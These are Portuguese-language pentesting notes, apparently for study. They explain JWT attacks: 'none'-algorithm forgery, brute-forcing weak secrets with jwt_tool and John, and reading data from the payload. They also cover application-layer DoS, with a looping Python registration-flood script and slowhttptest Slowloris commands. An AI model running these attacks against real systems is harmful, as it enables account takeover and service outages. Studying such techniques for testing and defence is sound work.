# Atacando Tokens JWT

## O que é JWT?

JSON Web Token é um padrão (RFC 7519) para autenticação stateless. O estado do usuário fica assinado no próprio token, armazenado no cliente - ao contrário de sessões no servidor.

Muito usado em: APIs RESTful, SPAs e apps mobile.

## Estrutura do JWT

Um JWT tem três partes separadas por `.`:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
[      HEADER (Base64)      ].[           PAYLOAD (Base64)           ].[  SIGNATURE  ]
```

### Header
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload
```json
{
  "sub": "1234567890",
  "name": "João",
  "role": "admin",
  "iat": 1516239022
}
```

### Signature
Garante que o token não foi alterado. Gerada com a chave secreta do servidor.

---

## Fluxo de autenticação

1. Usuário envia login e senha
2. Servidor valida e retorna um JWT assinado
3. Cliente armazena o JWT (localStorage ou cookie)
4. Client envia o JWT em cada requisição subsequente no header
5. Servidor verifica a assinatura e atende a requisição

---

## Vulnerabilidade 1: Algoritmo "none"

Alguns servidores aceitam tokens com `"alg": "none"`, ou seja, sem assinatura. Um atacante pode:

1. Decodificar o token JWT (Base64 é reversível)
2. Modificar o payload (ex: mudar `"role": "user"` para `"role": "admin"`)
3. Alterar o header para `"alg": "none"`
4. Remover a assinatura
5. Enviar o token modificado

**Antes:**
```json
{ "alg": "HS256", "typ": "JWT" }
{ "username": "user", "role": "user" }
assinatura_valida
```

**Depois (modificado):**
```json
{ "alg": "none", "typ": "JWT" }
{ "username": "user", "role": "admin" }
[vazio]
```

---

## Vulnerabilidade 2: Chave secreta fraca

Se o servidor usa uma chave secreta fraca (tipo `"secret"`, `"password"`, `"123456"`), é possível fazer brute force:

```bash
# Com jwt_tool
python jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Com John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 token.txt
```

Se descobrir a chave, você pode gerar tokens válidos para qualquer usuário.

---

## Vulnerabilidade 3: Dados sensíveis no Payload

O payload do JWT é apenas Base64 — qualquer um pode ler. Se a aplicação guardar no payload:
- Senhas (já aconteceu)
- Informações privadas
- Lógica de autorização que deveria ser server-side

...isso é uma exposição de dados sensíveis.

```bash
# Decodificar o payload de um JWT
echo "eyJzdWIiOiIxMjM0NTY3ODkwIn0" | base64 -d
```

---

## Exemplo de payload com dados sensíveis expostos

```json
{
  "username": "admin",
  "id_matricula": "00001",
  "password": "123456",    ← nunca deveria estar aqui!
  "role": "admin",
  "created_at": "1617189123456"
}
```

---
---

# Denial of Service (DoS)

## DoS por Stress (Resource Exhaustion)

Objetivo: sobrecarregar os recursos da aplicação (CPU, memória, conexões com banco) até o sistema falhar.

### Como fazer

1. Encontre uma ação que consome bastante recurso (cadastro, consulta pesada)
2. Intercepte a requisição no Burp e copie como cURL
3. Converta para Python em https://curlconverter.com/
4. Modifique o script para um loop infinito:

```python
import requests
import itertools

headers = {'Content-Type': 'application/json'}

for i in itertools.count():
    data = {'email': f'user{i}@exemplo.com', 'password': 'senha123'}
    r = requests.post('https://alvo.com/api/register', json=data, headers=headers)
    print(f'[{i}] Status: {r.status_code}')
```

---

## DoS por HTTP Flood (Slowloris)

Explora o fato de que o HTTP precisa que a requisição seja completamente recebida antes de processá-la. O ataque mantém muitas conexões abertas enviando dados muito lentamente, esgotando os workers do servidor.

### SlowHTTPTest

```bash
# Instalar
apt-get install slowhttptest

# Executar ataque Slowloris
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://alvo.com/index.php
```

Parâmetros:
- `-c 1000` → 1000 conexões
- `-H` → modo Slowloris
- `-g` → gerar estatísticas
- `-o slowhttp` → arquivo de saída
- `-i 10` → 10 segundos de timeout
- `-r 200` → 200 conexões por segundo
- `-t GET` → método HTTP

### Tipos de ataque disponíveis no SlowHTTPTest

- **Slowloris** (`-H`) → mantém conexões abertas com headers incompletos
- **Slow POST** (`-B`) → envia body muito lentamente
- **Slow Read** (`-X`) → lê a resposta muito devagar, mantendo o socket ocupado

---

## Impacto e contexto

Ataques DoS de camada de aplicação (Layer 7) são mais difíceis de detectar e mitigar do que ataques volumétricos (Layer 3/4), pois se parecem com tráfego legítimo. Rate limiting e timeouts agressivos são as principais defesas.
